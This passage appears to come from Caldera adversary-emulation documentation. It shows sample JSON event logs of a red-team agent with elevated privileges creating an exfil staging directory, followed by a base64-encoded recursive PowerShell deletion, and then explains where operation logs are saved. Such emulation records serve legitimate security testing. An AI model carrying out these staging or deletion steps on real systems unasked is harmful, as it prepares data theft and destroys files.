      "pid": 5896,
      "ppid": 2624,
      "privilege": "Elevated",
      "host": "WORKSTATION1",
      "contact": "HTTP",
      "created": "2021-02-23T11:48:33Z"
    },
    "ability_metadata": {
      "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
      "ability_name": "Create staging directory",
      "ability_description": "create a directory for exfil staging"
    },
    "operation_metadata": {
      "operation_name": "My Operation",
      "operation_start": "2021-02-23T11:50:12Z",
      "operation_adversary": "Collection"
    },
    "attack_metadata": {
      "tactic": "collection",
      "technique_name": "Data Staged: Local Data Staging",
      "technique_id": "T1074.001"
    },
    "output": {
      "stdout": "C:\\Users\\carlomagno\\staged",
      "stderr": "",
      "exit_code": "0"
    },
    "agent_reported_time": "2021-02-23T11:50:33Z"
  },
  {
    "command": "UmVtb3ZlLUl0ZW0gLVBhdGggInN0YWdlZCIgLXJlY3Vyc2U=",
    "delegated_timestamp": "2021-02-23T11:50:42Z",
    "collected_timestamp": "2021-02-23T11:50:44Z",
    "finished_timestamp": "2021-02-23T11:50:44Z",
    "status": 0,
    "platform": "windows",
    "executor": "psh",
    "pid": 6184,
    "agent_metadata": {
      "paw": "pertbn",
      "group": "red",
      "architecture": "amd64",
      "username": "BYZANTIUM\\Carlomagno",
      "location": "C:\\Users\\Public\\sandcat.exe",
      "pid": 5896,
      "ppid": 2624,
      "privilege": "Elevated",
      "host": "WORKSTATION1",
      "contact": "HTTP",
      "created": "2021-02-23T11:48:33Z"
    },
    "ability_metadata": {
      "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
      "ability_name": "Create staging directory",
      "ability_description": "create a directory for exfil staging"
    },
    "operation_metadata": {
      "operation_name": "My Operation",
      "operation_start": "2021-02-23T11:50:12Z",
      "operation_adversary": "Collection"
    },
    "attack_metadata": {
      "tactic": "collection",
      "technique_name": "Data Staged: Local Data Staging",
      "technique_id": "T1074.001"
    },
    "agent_reported_time": "2021-02-23T11:50:43Z"
  }
]
```

### Automatic Event Log Generation

When an operation terminates, the corresponding event logs will be written to disk in the same format as if they were manually requested for download. These event logs will contain command output and will be unencrypted on disk. Each operation will have its own event logs written to a separate file in the directory `$reports_dir/event_logs`, where `$reports_dir` is the `reports_dir` entry in the Caldera configuration file. The filename will be of the format `operation_$id.json`, where `$id` is the unique ID of the operation.
